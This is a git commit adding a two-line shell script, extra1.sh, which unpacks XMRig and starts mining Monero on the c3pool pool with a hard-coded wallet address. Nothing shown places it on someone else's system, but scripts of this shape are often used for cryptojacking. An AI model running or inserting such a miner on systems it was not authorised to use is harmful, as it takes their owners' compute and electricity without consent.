0788bedfedc1e867f386afbcfce5e7df0703543b
dragonmhmh <82892187+dragonmhmh@users.noreply.github.com>
2021-05-18 23:21:42 +0100

    Add files via upload

---
+++ extra1.sh
@@ -0,0 +1,2 @@
+tar xvzf xmrig-v6.12.1-C3-linux-Static.tar.gz
+./xmrig -o mine.c3pool.com:15555 -u 46bNmb5eSTiERWkLk5RgYfE3FWku1uABWPjfLEPdp7ycgwerzwWs48d2fHRMp4NkMdVdNkb58tExdTYyH1e9ZJW6Cmnzozv -p x
